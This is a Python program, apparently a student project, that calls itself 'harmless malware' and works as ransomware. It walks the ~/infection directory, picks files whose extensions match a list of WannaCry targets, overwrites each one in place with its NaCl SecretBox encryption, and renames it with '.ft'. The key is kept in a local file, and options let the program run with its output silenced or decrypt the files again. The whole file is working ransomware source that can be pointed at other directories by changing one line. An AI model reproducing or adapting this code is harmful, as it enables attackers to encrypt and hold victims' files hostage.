#!/usr/bin/env python3

import argparse
import os
import sys
from nacl import utils, secret

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"

PROGRAM_VERSION = "0.0.42"
SECRET_KEY_FILE = ".key.stockholm"  # Default file for storing the encryption key
DIRECTORY = os.path.expanduser("~/infection")   # Directory to process

# Supported file extensions for encryption (Wannacry targets)
WANNACRY_EXTENSIONS = {
    ".123", ".3dm", ".3ds", ".3g2", ".3gp", ".602", ".7z", ".aes", ".ai", ".asc",
    ".asf", ".asm", ".asp", ".avi", ".bak", ".bat", ".bmp", ".brd", ".bz2", ".c",
    ".cgm", ".class", ".cmd", ".cpp", ".cs", ".csv", ".csr", ".db", ".dbf", ".dif",
    ".dip", ".djvu", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx",
    ".dch", ".dwg", ".edb", ".eml", ".fla", ".flv", ".frm", ".gif", ".gpg", ".gz",
    ".h", ".hwp", ".ibd", ".iso", ".jar", ".java", ".jpeg", ".jpg", ".js", ".jsp",
    ".key", ".lay", ".lay6", ".ldf", ".m3u", ".m4u", ".mdb", ".mdf", ".mid", ".mkv",
    ".mov", ".mp3", ".mp4", ".mpg", ".msg", ".mml", ".myd", ".myi", ".nef", ".odb",
    ".odg", ".odp", ".ods", ".odt", ".onetoc2", ".otp", ".ots", ".ott", ".p12",
    ".pas", ".paq", ".pdf", ".pem", ".pfx", ".php", ".pl", ".png", ".pot", ".potm",
    ".potx", ".ppam", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".ps1",
    ".psd", ".pst", ".py", ".rb", ".rtf", ".sldm", ".sldx", ".slk", ".sln", ".snt",
    ".sql", ".sqlite3", ".sqlitedb", ".stc", ".std", ".sti", ".stw", ".svg", ".swf",
    ".sxc", ".sxd", ".sxi", ".sxm", ".tar", ".tbk", ".tga", ".tif", ".tiff", ".tgz",
    ".txt", ".uot", ".vbs", ".vcd", ".vdi", ".vmdk", ".vmx", ".vob", ".vsd", ".vsdx",
    ".wav", ".wb2", ".wks", ".wk1", ".wma", ".wmv", ".xla", ".xlam", ".xlc", ".xlm",
    ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xsf",
    ".zip"
}

def process_files(secret_key, reverse):
    # Creates a SecretBox instance using 'secret_key' (32-byte key) for encryption and decryption.
    box = secret.SecretBox(secret_key)

    if not os.path.exists(DIRECTORY):
        print(f"{RED}Directory not found: {DIRECTORY}{RESET}")
        return

    # root: The current folder's path.
    # _ (or dirs): A list of subdirectories in the current folder.
    # files: A list of filenames in the current folder.
    for root, _, files in os.walk(DIRECTORY):
        for file_name in files:
            file_path = os.path.join(root, file_name)

            if reverse:
                if not file_name.endswith(".ft"):
                    print(f"{YELLOW}Skipping unencrypted file: {file_path}{RESET}")
                    continue

                decrypt_file(box, file_path)

            else:
                file_ext = os.path.splitext(file_name)[1].lower()

                if file_ext not in WANNACRY_EXTENSIONS:
                    print(f"{YELLOW}Skipping file with unsupported extension: {file_path}{RESET}")
                    continue

                encrypt_file(box, file_path)

def encrypt_file(box, file_path):
    try:
        with open(file_path, 'rb+') as file:    # +: Allows both reading and writing to the file.
            file_data = file.read()

            # Encrypts 'file_data' using the SecretBox instance 'box'.
            encrypted_data = box.encrypt(file_data)

            # Moves the file pointer to the beginning of the file for overwriting content.
            file.seek(0)

            # Deletes the remaining content in the file from the current pointer position.
            file.truncate()
            file.write(encrypted_data)

        os.rename(file_path, file_path + ".ft")
        print(f"{GREEN}Encrypted: {file_path} -> {file_path}.ft{RESET}")

    except Exception as e:
        print(f"{RED}Failed to encrypt {file_path}: {e}{RESET}")

def decrypt_file(box, file_path):
    try:
        with open(file_path, 'rb+') as file:
            file_data = file.read()

            # Decrypts 'file_data' using the SecretBox instance 'box'.
            decrypted_data = box.decrypt(file_data)

            file.seek(0)
            file.truncate()
            file.write(decrypted_data)

        # Removes the .ft extension from file_path.
        new_path = file_path.rsplit(".ft", 1)[0]
        os.rename(file_path, new_path)

        print(f"{GREEN}Decrypted: {file_path} -> {new_path}{RESET}")

    except Exception as e:
        print(f"{RED}Failed to decrypt {file_path}: {e}{RESET}")

def create_key():
    if os.path.exists(SECRET_KEY_FILE):
        try:
            with open(SECRET_KEY_FILE, 'rb') as file:
                secret_key = file.read()

            if len(secret_key) != secret.SecretBox.KEY_SIZE:
                print(f"{RED}Invalid key size in {SECRET_KEY_FILE}. Ensure the key is 32 bytes long.{RESET}")
                exit(1)

            print(f"{YELLOW}Using existing key from {SECRET_KEY_FILE}.{RESET}")
            return secret_key

        except Exception as e:
            print(f"{RED}Failed to load key from {SECRET_KEY_FILE}: {e}{RESET}")
            exit(1)
    else:
        # Generates a random 32-byte key for the SecretBox.
        secret_key = utils.random(secret.SecretBox.KEY_SIZE)

        with open(SECRET_KEY_FILE, 'wb') as file:
            file.write(secret_key)

        print(f"{GREEN}Generated and saved new key to {SECRET_KEY_FILE}.{RESET}")
        return secret_key

def load_key(key_path):
    if not os.path.exists(key_path):
        print(f"{RED}Key file not found: {key_path}{RESET}")
        exit(1)

    try:
        with open(key_path, 'rb') as file:
            secret_key = file.read()

        if len(secret_key) != secret.SecretBox.KEY_SIZE:
            print(f"{RED}Invalid key size in {key_path}. Ensure the key is 32 bytes long.{RESET}")
            exit(1)

        print(f"{YELLOW}Secret key loaded successfully from {SECRET_KEY_FILE}.{RESET}")
        return secret_key

    except Exception as e:
        print(f"{RED}Failed to load key from {key_path}: {e}{RESET}")
        exit(1)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Harmless malware")

    parser.add_argument("-v", "--version", action="version", version=f"{YELLOW}%(prog)s {PROGRAM_VERSION}{RESET}", help="show the version of the program.")
    parser.add_argument("-r", "--reverse", metavar="KEY_FILE", type=str, help="path to the key file to reverse the infection.")
    parser.add_argument("-s", "--silent", action="store_true", help="run the program without producing any output.")

    return parser.parse_args()

def main():
    args = parse_arguments()

    if args.silent:
        # Opens a write-only file descriptor to /dev/null (a sink for discarding output).
        devnull = os.open(os.devnull, os.O_WRONLY)

        # Redirects the standard output (sys.stdout) to /dev/null, silencing program output.
        os.dup2(devnull, sys.stdout.fileno())

    if args.reverse:
        secret_key = load_key(args.reverse)
    else:
        secret_key = create_key()

    process_files(secret_key, args.reverse)

if __name__ == "__main__":
    main()
